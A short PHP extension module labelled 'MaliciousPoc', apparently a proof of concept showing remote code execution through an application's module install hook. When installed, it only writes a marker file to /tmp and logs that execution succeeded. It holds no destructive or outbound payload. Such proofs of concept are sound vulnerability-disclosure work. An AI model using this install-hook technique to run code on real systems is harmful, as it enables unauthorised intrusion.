<?php

namespace Modules\MaliciousPoc;

use App\Extension\AbstractModule;
use Illuminate\Support\Facades\Log;

class Module extends AbstractModule
{
    public function install(): bool
    {
        Log::info('[EXP] RCE executed!');

        $markerPath = '/tmp/rce_poc' . uniqid() . '.txt';
        $nonce = bin2hex(random_bytes(8));

        $content = "RCE_POC: {$nonce}\n";
        $content .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $content .= "Extension: malicious-poc\n";
        $content .= "Method: Module::install()\n";

        file_put_contents($markerPath, $content);

        Log::info("RCE confirmed - marker: {$markerPath}");

        return parent::install();
    }

    public function boot()
    {
        parent::boot();
    }

    public function register()
    {
        $this->registerConfig();
        $this->registerProviders();
    }
}
